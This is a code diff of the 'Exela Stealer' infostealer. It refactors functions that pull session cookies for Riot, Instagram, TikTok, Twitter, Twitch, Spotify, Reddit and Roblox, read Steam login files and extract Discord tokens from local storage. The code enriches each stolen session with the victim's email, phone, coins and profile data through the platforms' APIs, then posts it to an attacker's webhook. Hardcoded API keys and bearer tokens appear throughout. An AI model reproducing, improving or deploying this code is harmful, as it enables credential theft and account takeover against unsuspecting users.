+                fields = [
+                    {"name": "Username", "value": "``" + username + "``", "inline": True},
+                    {"name": "Email", "value": "``" + email + "``", "inline": True},
+                    {"name": "Region", "value": "``" +  region + "``", "inline": True},
+                    {"name": "Locale", "value": "``" + locale + "``", "inline": True},
+                    {"name": "Country", "value":"``" + country  + "``", "inline": True},
+                    {"name": "MFA Enabled?", "value": "``" + mfa + "``", "inline": True},
+                    {"name": "Cookie", "value": "``" + cookie + "``", "inline": False},]
+                embed_data["fields"] = fields
+                payload = {
+                    "username": "Exela Stealer",
+                    "embeds": [embed_data]
+                }
+                headers = {
+                    "Content-Type": "application/json"
+                }
+                async with session.post(webhook, json=payload, headers=headers) as response:
+                    pass
+        except:
+            pass
+        else:
+            self.riotGamesSessionList.append(f'Username : {username}\nEmail : {email}\nRegion : {region}\nLocale : {locale}\nCountry : {country}\nMFA Enabled : {mfa}\nCookie : {cookie}\n======================================================================\n')
+    async def InstaSession(self, cookie, browser:str) -> None:
         try:
             pp = "https://i.hizliresim.com/8po0puy.jfif"
             bio = ""
             fullname = ""
-            sessionid = "sessionid=" + cookie
-            headers = {"user-agent": "Instagram 219.0.0.12.117 Android", "cookie":sessionid}
+            headers = {
+                    "user-agent": "Instagram 219.0.0.12.117 Android",
+                    "cookie": f"sessionid={cookie}"
+                }
             infoURL = 'https://i.instagram.com/api/v1/accounts/current_user/?edit=true'
-            data = requests.get(infoURL, headers=headers).json()    
-            infoURL2 = f"https://i.instagram.com/api/v1/users/{data['user']['pk']}/info/"
-            data2 = requests.get(infoURL2, headers=headers).json()
+
+            async with aiohttp.ClientSession(headers=headers, connector=aiohttp.TCPConnector(ssl=True)) as session:
+                async with session.get(infoURL) as response:
+                    data = await response.json()
+                async with session.get(f"https://i.instagram.com/api/v1/users/{data['user']['pk']}/info/") as response:
+                    data2 = await response.json()                
+
             try:
                 pp = data["user"]["profile_pic_url"]
             except:
                 pass
+
             username = data["user"]["username"]
             profileURL = "https://instagram.com/" + username
+
             if data["user"]["biography"] == "":
                 bio = "No bio"
-            else:bio = data["user"]["biography"]
+            else:
+                bio = data["user"]["biography"]
+            bio = bio.replace("\n", ", ")
             if data["user"]["full_name"] == "":
                 fullname = "No nickname"
-            else:fullname = data["user"]["full_name"]
+            else:
+                fullname = data["user"]["full_name"]
+
             email = data["user"]["email"]
             verify = data["user"]["is_verified"]
             followers = data2["user"]["follower_count"]
             following = data2["user"]["following_count"]
-            embed = dhooks.Embed(title="***Exela Stealer***", description=f"***Exela Instagram Session was detected on the{value} Browser***", color=0x070707, url="https://t.me/ExelaStealer",timestamp = "now")
-            embed.set_thumbnail(url=pp)
-            embed.add_field(name="Instagram Cookie", inline=True, value=f"```{sessionid}```")
-            embed.add_field(name="Profile URL", inline=False, value=f"```{profileURL}```")
-            embed.add_field(name="Username", inline=True, value=f"```{username}```")
-            embed.add_field(name="Nick Name", inline=True, value=f"```{fullname}```")
-            embed.add_field(name="is Verified", inline=True, value=f"```{verify}```")
-            embed.add_field(name="Email", inline=True, value=f"```{email}```")
-            embed.add_field(name="Followers", inline=True, value=f"```{followers}```")
-            embed.add_field(name="Following", inline=True, value=f"```{following}```")
-            embed.add_field(name="Biography", inline=False, value=f"```{bio}```")
-            embed.set_footer(text="https://t.me/ExelaStealer")
-            self.hook.send(embed=embed)  
-            self.instagram_account_list.append(f"Instagram Cookie : {sessionid}\nProfile URL : {profileURL}\nUser Name : {username}\nNick Name : {fullname}\nis Verified : {verify}\nEmail : {email}\nBiography : {bio}\n==========================================================================")
-        except:
-            pass
-    def setTwitterSession(self, cookie, value):
-        try:
-            description = ''
-            authToken = f'{cookie};ct0=ac1aa9d58c8798f0932410a1a564eb42' # this is ct0=ac1aa9d58c8798f0932410a1a564eb42 csrf token
-            header = {'authority': 'twitter.com', 'accept': '*/*', 'accept-language': 'en-US,en;q=0.9',
-            'authorization': 'Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA',
-            'origin': 'https://twitter.com', 'referer': 'https://twitter.com/home', 'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'sec-gpc': '1',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
-            'x-twitter-active-user': 'yes', 'x-twitter-auth-type': 'OAuth2Session', 'x-twitter-client-language': 'en',
-            'x-csrf-token': 'ac1aa9d58c8798f0932410a1a564eb42'}
-            url = "https://twitter.com/i/api/1.1/account/update_profile.json"
-            req = requests.post(url, headers=header, cookies={'auth_token': authToken}).json()
-            embed = dhooks.Embed(title="***Exela Stealer***", description=f"***Exela Twitter Session was detected on the {value} browser***", color=0x070707, url="https://t.me/ExelaStealer",timestamp = "now")
-            try:
-                if req["description"] == "":
-                    description == "There is no bio"
-                else:
-                    description = req["description"]
-            except:
-                description = "There is no biography"
-            pp = req["profile_image_url_https"]
-            username = req["name"]
-            nickname = req["screen_name"]
-            profileURL = "https://twitter.com/" + username
-            embed.set_thumbnail(url=pp)
-            embed.add_field(name="Twitter Cookie", inline=True, value=f"```{cookie}```")
-            embed.add_field(name="Profile URL", inline=False, value=f"```{profileURL}```")
-            embed.add_field(name="Username", inline=True, value=f"```{username}```")
-            embed.add_field(name="Screen Name", inline=True, value=f"```{nickname}```")
-            embed.add_field(name="Biography", inline=False, value=f"```{description}```")
-            embed.add_field(name="Follower Count", inline=True, value=f"```{req['followers_count']}```")
-            embed.add_field(name="Following Count", inline=True, value=f"```{req['friends_count']}```")
-            embed.add_field(name="Total Tweets", inline=True, value=f"```{req['statuses_count']}```")
-            embed.add_field(name="Created At", inline=True, value=f"```{req['created_at']}```")
-            embed.add_field(name="Is Verified", inline=True, value=f"```{req['verified']}```")
-            embed.set_footer(text="https://t.me/ExelaStealer")
-            self.hook.send(embed=embed)
-            self.twitter_account_list.append(f"Twitter Cookie : {cookie}\nProfile URL : {profileURL}\nUser Name : {username}\nScreen Name : {nickname}\nBiography : {description}\nFollower Count : {req['followers_count']}\nFollowing Count : {req['friends_count']}\nTotal Tweets : {req['statuses_count']}\nCreated At : {req['created_at']}\nIs Verified : {req['verified']}\n==========================================================================")                                        
-        except:
-            pass
-    def setTiktokSession(self, cookie, value):
+            embed_data = {
+                "title": "***Exela Stealer***",
+                "description": f"***Exela Instagram Session was detected on the {browser} browser***",
+                "url" : "https://t.me/ExelaStealer",
+                "color": 0,
+                "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd"},
+                "thumbnail": {"url": pp}}
+            fields = [
+                {"name": "Username", "value": "``" + username + "``", "inline": True},
+                {"name": "Nick Name", "value": "``" + fullname + "``", "inline": True},
+                {"name": "Email", "value": "``" +  email + "``", "inline": True},
+                {"name": "is Verified", "value": "``" + str(verify) + "``", "inline": True},
+                {"name": "Followers", "value":"``" + str(followers) + "``", "inline": True},
+                {"name": "Following", "value": "``" + str(following) + "``", "inline": True},
+                {"name": "Profile URL", "value": "``" + profileURL + "``", "inline": False},
+                {"name": "Biography", "value": "``" + bio + "``", "inline": False},
+                {"name": "Cookie", "value": "``" + cookie + "``", "inline": False},]
+            embed_data["fields"] = fields
+            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
+                payload = {
+                    "username": "Exela Stealer",
+                    "embeds": [embed_data]
+                }
+                headers = {
+                    "Content-Type": "application/json"
+                }
+                async with session.post(webhook, json=payload, headers=headers) as response:
+                    pass
+            
+        except Exception as e:
+            print(str(e))
+        else:
+            self.instagramSessionList.append(f"Cookie : {cookie}\nProfile URL : {profileURL}\nUsername : {username}\nNick Name : {fullname}\nis Verified : {verify}\nEmail : {email}\nFollowers : {followers}\nFollowing : {following}\nBiography : {bio}\n======================================================================\n")
+    async def TikTokSession(self, cookie, browser:str) -> None:
         try:
             email = ''
             phone = ''
             cookies = "sessionid=" + cookie
-            headers = { "cookie": cookies, "Accept-Encoding": "identity"}
-            headers2 = { "cookie": cookies}
-            Url = 'https://www.tiktok.com/passport/web/account/info/?aid=1459&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&device_platform=web_pc&focus_state=true&from_page=fyp&history_len=2&is_fullscreen=false&is_page_visible=true&os=windows&priority_region=DE&referer=&region=DE&screen_height=1080&screen_width=1920&tz_name=Europe%2FBerlin&webcast_language=de-DE'
-            Url2 = 'https://webcast.tiktok.com/webcast/wallet_api/diamond_buy/permission/?aid=1988&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true'
-            data = requests.get(Url, headers=headers).json()
-            data2 = requests.get(Url2, headers=headers2).json()
+            headers = {"cookie": cookies, "Accept-Encoding": "identity"}
+            headers2 = {"cookie": cookies}
+            url = 'https://www.tiktok.com/passport/web/account/info/?aid=1459&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&device_platform=web_pc&focus_state=true&from_page=fyp&history_len=2&is_fullscreen=false&is_page_visible=true&os=windows&priority_region=DE&referer=&region=DE&screen_height=1080&screen_width=1920&tz_name=Europe%2FBerlin&webcast_language=de-DE'
+            url2 = 'https://webcast.tiktok.com/webcast/wallet_api/diamond_buy/permission/?aid=1988&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true'
+            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
+                async with session.get(url, headers=headers) as response:
+                    data = await response.json()
+                async with session.get(url2, headers=headers2) as response2:
+                    data2 = await response2.json()
+
             user_id = data["data"]["user_id"]
-            if data["data"]["email"] == "":
+            if not data["data"]["email"]:
                 email = "No Email"
-            else:email = data["data"]["email"]
-            if data["data"]["mobile"] == "":
+            else:
+                email = data["data"]["email"]
+            if not data["data"]["mobile"]:
                 phone = "No number"
             else:
                 phone = data["data"]["mobile"]
-            useranme = data["data"]["username"]
+            username = data["data"]["username"]
             coins = data2["data"]["coins"]
-            embed = dhooks.Embed(title="***Exela Stealer***", description=f"***Exela Tiktok Session was detected on the{value} browser***", color=0x070707, url="https://t.me/ExelaStealer", timestamp = "now")
-            embed.set_thumbnail(url="https://i.hizliresim.com/eai9bwi.jpg")
-            embed.add_field(name="Tiktok Cookie", inline=True, value=f"```{cookies}```")
-            embed.add_field(name="User identifier", inline=False, value=f"```{user_id}```")
-            embed.add_field(name="Profile URL", inline=False, value=f"```https://tiktok.com/@{useranme}```")
-            embed.add_field(name="Username", inline=False, value=f"```{useranme}```")
-            embed.add_field(name="Email", inline=True, value=f"```{email}```")
-            embed.add_field(name="Phone", inline=True, value=f"```{phone}```")
-            embed.add_field(name="Coins", inline=True, value=f"```{coins}```")
-            embed.set_footer(text="https://t.me/ExelaStealer")
-            self.hook.send(embed=embed)
-            self.tiktok_account_list.append(f"Tiktok Cookie : {cookies}\nUser identifier : {user_id}\nProfile URL : https://tiktok.com/@{useranme}\nEmail : {email}\nPhone : {phone}\nCoins : {coins}\n==========================================================================")
+
+            embed_data = {
+                "title": "***Exela Stealer***",
+                "description": f"***Exela Tiktok Session was detected on the {browser} browser***",
+                "url" : "https://t.me/ExelaStealer",
+                "color": 0,
+                "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd"},
+                "thumbnail": {"url": "https://i.hizliresim.com/eai9bwi.jpg"}}
+            fields = [
+                {"name": "Username", "value": "``" + username + "``", "inline": True},
+                {"name": "Email", "value": "``" + email + "``", "inline": True},
+                {"name": "Phone", "value": "``" +  str(phone) + "``", "inline": True},
+                {"name": "User identifier", "value": "``" + str(user_id) + "``", "inline": True},
+                {"name": "Coins", "value":"``" + str(coins) + "``", "inline": True},
+                {"name": "Profile URL", "value": "``" + f'https://tiktok.com/@{username}' + "``", "inline": False},
+                {"name": "Tiktok Cookie", "value": "``" + cookie + "``", "inline": False},]
+            embed_data["fields"] = fields
+            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
+                payload = {
+                    "username": "Exela Stealer",
+                    "embeds": [embed_data]
+                }
+                headers = {
+                    "Content-Type": "application/json"
+                }
+                async with session.post(webhook, json=payload, headers=headers) as response:
+                    pass
         except:
             pass
-    def setRedditSession(self, cookie, value):
+        else:
+            self.tiktokSessionList.append(f"Cookie : {cookies}\nUser identifier : {user_id}\nProfile URL : https://tiktok.com/@{username}\nUsername : {username}\nEmail : {email}\nPhone : {phone}\nCoins : {coins}\n======================================================================\n")
+
+    async def TwitterSession(self, cookie, browser:str) -> None:
+        try:
+            description = ''
+            authToken = f'{cookie};ct0=ac1aa9d58c8798f0932410a1a564eb42'
+            headers = {
+                'authority': 'twitter.com',
+                'accept': '*/*',
+                'accept-language': 'en-US,en;q=0.9',
+                'authorization': 'Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA',
+                'origin': 'https://twitter.com',
+                'referer': 'https://twitter.com/home',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'sec-gpc': '1',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
+                'x-twitter-active-user': 'yes',
+                'x-twitter-auth-type': 'OAuth2Session',
+                'x-twitter-client-language': 'en',
+                'x-csrf-token': 'ac1aa9d58c8798f0932410a1a564eb42',
+                "cookie" : f'auth_token={authToken}'
+            }
+            url = "https://twitter.com/i/api/1.1/account/update_profile.json"
+
+            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
+                async with session.post(url, headers=headers) as response:
+                    req = await response.json()
+            
+            
+            try:
+                if req["description"] == "":
+                    description = "There is no bio"
+                else:
+                    description = req["description"]
+            except:
+                description = "There is no biography"
+            description = description.replace("\n", ", ")
+            pp = req["profile_image_url_https"]
+            username = req["name"]
+            nickname = req["screen_name"]
+            profileURL = "https://twitter.com/" + username
+            embed_data = {
+                "title": "***Exela Stealer***",
+                "description": f"***Exela Twitter Session was detected on the {browser} browser***",
+                "url" : "https://t.me/ExelaStealer",
+                "color": 0,
+                "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd"},
+                "thumbnail": {"url": pp}}
+            fields = [
+                {"name": "Username", "value": "``" + username + "``", "inline": True},
+                {"name": "Screen Name", "value": "``" + nickname + "``", "inline": True},
+                {"name": "Followers", "value": "``" +  str(req['followers_count']) + "``", "inline": True},
+                {"name": "Following", "value": "``" + str(req['friends_count']) + "``", "inline": True},
+                {"name": "Tweets", "value":"``" + str(req['statuses_count']) + "``", "inline": True},
+                {"name": "Is Verified", "value": "``" + str(req['verified']) + "``", "inline": True},
+                {"name": "Created At", "value": "``" + str(req['created_at']) + "``", "inline": True},
+                {"name": "Biography", "value": "``" + str(description) + "``", "inline": False},
+                {"name": "Profile URL", "value": "``" + str(profileURL) + "``", "inline": False},
+                {"name": "Cookie", "value": "``" + str(cookie) + "``", "inline": False},
+                ]
+            embed_data["fields"] = fields
+            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
+                payload = {
+                    "username": "Exela Stealer",
+                    "embeds": [embed_data]
+                }
+                headers = {
+                    "Content-Type": "application/json"
+                }
+                async with session.post(webhook, json=payload, headers=headers) as response:
+                    pass
+            
+            self.twitterSessionList.append(f"Username : {username}\nScreen Name : {nickname}\nFollowers : {req['followers_count']}\nFollowing : {req['friends_count']}\nTweets : {req['statuses_count']}\nVerified : {req['verified']}\nCreated At : {req['created_at']}\nProfile URL : {profileURL}\nCookie : {cookie}\nBiography : {description}\n=====================================================\n")
+        except Exception as e:
+            print(str(e))
+
+    
+    async def TwitchSession(self, auth_token, username, browser:str) -> None:
+        try:
+            url = 'https://gql.twitch.tv/gql'
+            headers = {
+                'Authorization': f'OAuth {auth_token}',
+            }
+
+            query = f"""
+            query {{
+                user(login: "{username}") {{
+                    id
+                    login
+                    displayName
+                    email
+                    hasPrime
+                    isPartner
+                    language
+                    profileImageURL(width: 300)
+                    bitsBalance
+                    followers {{
+                        totalCount
+                    }}
+                }}
+            }}"""
+
+            data = {
+                "query": query
+            }
+
+            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
+                async with session.post(url, headers=headers, json=data) as response:
+                    if response.status == 200:
+                        response_data = await response.json()
+            data = response_data["data"]["user"]
+            id = data["id"]
+            login = data["login"]
+            acc_url = f"https://www.twitch.tv/{login}"
+            displayName = data["displayName"]
+            email = data["email"]
+            hasPrime = data["hasPrime"]
+            isPartner = data["isPartner"]
+            lang = data["language"]
+            pp = 'https://i.hizliresim.com/eai9bwi.jpg'
+            try:
+                pp = data["profileImageURL"]
+            except:pass
+            bits = data["bitsBalance"]
+            followers = data["followers"]["totalCount"]
+            embed_data = {
+                "title": "***Exela Stealer***",
+                "description": f"***Exela Twitch Session was detected on the {browser} browser***",
+                "url" : "https://t.me/ExelaStealer",
+                "color": 0,
+                "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd"},
+                "thumbnail": {"url": pp}}
+            fields = [
+                {"name": "Username", "value": "``" + str(login) + "``", "inline": True},
+                {"name": "Display Name", "value": "``" + str(displayName) + "``", "inline": True},
+                {"name": "Email", "value": "``" +  str(email) + "``", "inline": True},
+                {"name": "ID", "value": "``" + str(id) + "``", "inline": True},
+                {"name": "Has Prime?", "value":"``" + str(hasPrime) + "``", "inline": True},
+                {"name": "is Partner?", "value": "``" + str(isPartner) + "``", "inline": True},
+                {"name": "Language", "value": "``" + str(lang) + "``", "inline": True},
+                {"name": "Bit", "value": "``" + str(bits) + "``", "inline": True},
+                {"name": "Followers", "value": "``" + str(followers) + "``", "inline": True},
+                {"name": "Profile URL", "value": "``" + str(acc_url) + "``", "inline": False},
+                {"name": "Cookie", "value": "``" + str(auth_token) + "``", "inline": False},]
+            embed_data["fields"] = fields
+            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
+                payload = {
+                    "username": "Exela Stealer",
+                    "embeds": [embed_data]
+                }
+                headers = {
+                    "Content-Type": "application/json"
+                }
+                async with session.post(webhook, json=payload, headers=headers) as response:
+                    pass
+        except:
+            pass
+        else:
+            self.twitchSessionList.append(f"Cookie : {auth_token}\nProfile URL : {acc_url}\nID : {id}\nUsername : {login}\nDisplay Name : {displayName}\nEmail : {email}\nHas Prime : {hasPrime}\nis Partner : {isPartner}\nLanguage : {lang}\nBits : {bits}\nFollowers : {followers}\n======================================================================\n")
+    async def SpotifySession(self, cookie, browser:str) -> None:
+        try:
+            url = 'https://www.spotify.com/api/account-settings/v1/profile'
+
+            headers = {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36',
+                'Cookie': (
+                    f'sp_dc={cookie}'
+                )
+            }
+
+            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
+                async with session.get(url, headers=headers) as response:
+                    data = await response.text()
+                    data = json.loads(data)["profile"]
+
+
+            email = data["email"]
+            gender = data["gender"]
+            birthdate = data["birthdate"]
+            country = data["country"]
+            username = data["username"]
+            embed_data = {
+                "title": "***Exela Stealer***",
+                "description": f"***Exela Spotify Session was detected on the {browser} browser***",
+                "url" : "https://t.me/ExelaStealer",
+                "color": 0,
+                "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd"},
+                "thumbnail": {"url": "https://media.discordapp.net/attachments/1145679170127532095/1145756091553173696/3-min-5.jpg"}}
+            fields = [
+                {"name": "Email", "value": "``" + str(email) + "``", "inline": True},
+                {"name": "Username", "value": "``" + str(username) + "``", "inline": True},
+                {"name": "Gender", "value": "``" +  str(gender) + "``", "inline": True},
+                {"name": "birthdate", "value": "``" + str(birthdate) + "``", "inline": True},
+                {"name": "country", "value":"``" + str(country) + "``", "inline": True},
+                {"name": "Profile URL", "value": "``" + str(f'https://open.spotify.com/user/{username}') + "``", "inline": False},
+                {"name": "Spotify Cookie", "value": "``" + str(cookie) + "``", "inline": False},]
+            embed_data["fields"] = fields
+            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
+                payload = {
+                    "username": "Exela Stealer",
+                    "embeds": [embed_data]
+                }
+                headers = {
+                    "Content-Type": "application/json"
+                }
+                async with session.post(webhook, json=payload, headers=headers) as response:
+                    pass
+        except:
+            pass
+        else:
+            self.spotifySessionList.append(f"Cookie : {cookie}\nProfile URL : https://open.spotify.com/user/{username}\nEmail : {email}\nUsername : {username}\nGender : {gender}\nBirthdate : {birthdate}\nCountry : {country}\n======================================================================\n")
+    async def RedditSession(self, cookie, browser:str) -> None:
         try:
             gmail = ""
             cookies = "reddit_session=" + cookie
-            headers = { "cookie": cookies, "Authorization": "Basic b2hYcG9xclpZdWIxa2c6" }
-            jsonData = { "scopes": ["*", "email", "pii"] }
+            headers = {
+                    "cookie": cookies,
+                    "Authorization": "Basic b2hYcG9xclpZdWIxa2c6"
+                }
+            jsonData = {"scopes": ["*", "email", "pii"]}
             Url = 'https://accounts.reddit.com/api/access_token'
             Url2 = 'https://oauth.reddit.com/api/v1/me'
-            req = requests.post(Url, json=jsonData, headers=headers).json()
-            accessToken = req["access_token"]
-            headers2 = {'User-Agent':'android:com.example.myredditapp:v1.2.3', "Authorization": "Bearer " + accessToken}
-            data2 = requests.get(Url2, headers=headers2).json()
-            try:
-                if data2["email"] == "":
-                    gmail = "No email"
-                else:gmail = data2["email"]
-            except Exception as e:
-                gmail = "No Email"
-            pp = data2["icon_img"]
-            username =  data2["name"]
-            profileUrl = 'https://www.reddit.com/user/' + username
-            commentKarma = data2["comment_karma"]
-            totalKarma = data2["total_karma"]
-            coins = data2["coins"]
-            mod = data2["is_mod"]
-            gold = data2["is_gold"]
-            suspended = data2["is_suspended"]
-            embed = dhooks.Embed(title="***Exela Stealer***", description=f"***Exela Reddit Session was detected on the{value} browser***", color=0x070707, url="https://t.me/ExelaStealer", timestamp = "now")
-            embed.set_thumbnail(url=pp)
-            embed.add_field(name="Reddit Cookie", inline=True, value=f"```{cookies}```")
-            embed.add_field(name="Profile URL", inline=False, value=f"```{profileUrl}```")
-            embed.add_field(name="Username", inline=False, value=f"```{username}```")
-            embed.add_field(name="Email", inline=True, value=f"```{gmail}```")
-            embed.add_field(name="Comment Karma", inline=True, value=f"```{commentKarma}```")
-            embed.add_field(name="Total Karma", inline=True, value=f"```{totalKarma}```")
-            embed.add_field(name="Coins", inline=True, value=f"```{coins}```")
-            embed.add_field(name="Is Mod", inline=True, value=f"```{mod}```")
-            embed.add_field(name="Is Gold", inline=True, value=f"```{gold}```")
-            embed.add_field(name="Suspended", inline=True, value=f"```{suspended}```")
-            embed.set_footer(text="https://t.me/ExelaStealer")
-            self.hook.send(embed=embed)
-            self.reddit_account_list.append(f"Reddit Cookie : {cookies}\nProfile URL : {profileUrl}\nUsername : {username}\nEmail : {gmail}\nComment Karma: {commentKarma}\nTotal Karma : {totalKarma}\nCoins : {coins}\nIs Mod : {mod}\nIs Gold : {gold}\nSuspended : {suspended}\n==========================================================================")
-        except:
-            pass
-    def setSteam(self):
-        try:
-            steamLocalUserDataPath = "C:\Program Files (x86)\Steam\config\loginusers.vdf"
-            if os.path.isfile(steamLocalUserDataPath):
-                filee = open(steamLocalUserDataPath, "r", encoding="utf-8", errors="ignore")
-                data = filee.read()
-                steamid = re.findall(r"7656[0-9]{13}", data)
-                if steamid:
-                    result = "".join(steamid)
-                    accountInfo = requests.get('https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=440D7F4D810EF9298D25EDDF37C1F902&steamids=' + result).text
-                    playerInfo = requests.get('https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid=' + result).json()
-                    dataa = json.loads(accountInfo.replace('[', "").replace(']', ""))["response"]["players"]
-                    data2 = playerInfo["response"]["player_level"]
-                    pp = dataa["avatarfull"]
-                    idf = dataa["steamid"]
-                    profileURL = dataa["profileurl"]
-                    displayName = dataa["personaname"]
-                    timecreated = dataa["timecreated"]
-                    embed = dhooks.Embed(title="***Exela Stealer***", description="***Exela Steam Session Detected***", color=0x070707, url="https://t.me/ExelaStealer", timestamp = "now")
-                    embed.set_thumbnail(url=pp)
-                    embed.add_field(name="Steam Identifier", inline=False, value=f"```{idf}```")
-                    embed.add_field(name="Profile URL",  inline=False,value=f"```{profileURL}```")
-                    embed.add_field(name="Profil Name",  inline=True,value=f"```{displayName}```")
-                    embed.add_field(name="Time Created",  inline=True,value=f"```{timecreated}```")
-                    embed.add_field(name="Player Level", inline=True, value=f"```{data2}```")
-                    embed.set_footer(text="https://t.me/ExelaStealer")
-                    self.hook.send(embed=embed)
-                    self.steam_account_list.append(f"Steam Identifier : {idf}\nProfile URL : {profileURL}\nProfil Name : {displayName}\nTime Created : {timecreated}\nPlayer Level : {data2}\n==========================================================================")
-        except Exception as e:
-            print(str(e))
-        else:
-            print("succes")
-    def setRoblox(self, cookie, value):
-        try:
-            email = ""
-            robuxCookie = '.ROBLOSECURITY=' + cookie
-            headers = {'cookie':robuxCookie,"Accept-Encoding": "identity"}
-            accinfo = requests.get('https://www.roblox.com/my/account/json', headers=headers).json()
-            try:
-                if accinfo["UserEmail"] == None:
-                    email = "No Email"
-                else:email = accinfo["UserEmail"]
-            except:email = accinfo["UserEmail"]
-            url = "https://economy.roblox.com/v1/users/" + str(accinfo["UserId"]) + "/currency"
-            robux = requests.get(url, headers=headers).json()["robux"]
-            url2 = "https://thumbnails.roblox.com/v1/users/avatar?userIds=" + str(accinfo['UserId']) + "&size=420x420&format=Png&isCircular=false"
-            picUrl = requests.get(url2, headers=headers).json()["data"][0]["imageUrl"]
-            embed = dhooks.Embed(title="***Exela Stealer***", description=f"***Exela Roblox Session was Detected on{value} browser***", color=0x070707, url="https://t.me/ExelaStealer", timestamp = "now")
-            embed.set_thumbnail(url=picUrl)
-            embed.add_field(name="Roblox Cookie", inline=False, value=f"```{robuxCookie}```")
-            embed.add_field(name="Profile URL", inline=False, value=f"```{picUrl}```")
-            embed.add_field(name="Total Robux", inline=False, value=f"```{robux}```")
-            embed.add_field(name="Name", inline=False, value=f"```{accinfo['Name']}```")
-            embed.add_field(name="Email", inline=False, value=f"```{email}```")
-            embed.add_field(name="Email Verified", inline=False, value=f"```{accinfo['IsEmailVerified']}```")
-            embed.set_footer(text="https://t.me/ExelaStealer")
-            self.hook.send(embed=embed)
-            self.robloxx.append(f"Roblox Cookie : {robuxCookie}\nProfile URL : {picUrl}\nTotal Robux : {robux}\nName : {accinfo['Name']}\nEmail : {email}\nEmail Verified : {accinfo['Name']}\n==========================================================================")
-        except:
-            pass
-    def setSpotfiy(self):
-        pass
-    def setYoutube(self):
-        pass
-    def setTwitch(self):
-        pass
-    def setDiscord(self):
-        try:
-            paths = {
-                "Discord" : os.getenv("appdata") +  "\\" + os.path.join("discord", "Local Storage", "leveldb"),
-                "Discord Canary" : os.getenv("appdata") + "\\" + os.path.join("discordcanary", "Local Storage", "leveldb"),
-                "Discord PTB" : os.getenv("appdata") + "\\" + os.path.join("discordptb", "Local Storage", "leveldb"),
-                'Opera GX' : self.roaming_app_data + os.path.join("\Opera Software", "Opera GX Stable"),
-                'Opera' : self.roaming_app_data + os.path.join("\Opera Software", "Opera Stable"),
-                'Chrome' : self.local_app_data + os.path.join("\Google", "Chrome","User Data"),
-                'Brave' : self.local_app_data + os.path.join("\BraveSoftware", "Brave-Browser","User Data"),
-                'Edge' : self.local_app_data + os.path.join("\Microsoft", "Edge","User Data"),
-                'Vivaldi' : self.local_app_data + os.path.join("\Vivaldi","User Data"),}
-            for name, path in paths.items():
-                if "cord" in path: # extract tokens from discord's
-                    if os.path.exists(path):
-                        key = SubModules.GetKey(path.replace(r"Local Storage\leveldb", "Local State"))
-                        for y in os.listdir(path):
-                            full_path = os.path.join(path, y)
-                            if full_path[-3:] in ["log", "ldb"]:
-                                with open(full_path, "r", encoding="utf-8", errors="ignore") as files:
-                                    for tokens in re.findall(r"dQw4w9WgXcQ:[^\"]*", files.read()):
-                                        if tokens:
-                                            enc_token = base64.b64decode(tokens.split("dQw4w9WgXcQ:")[1])
-                                            dec_token = SubModules.Decrpytion(enc_token, key)
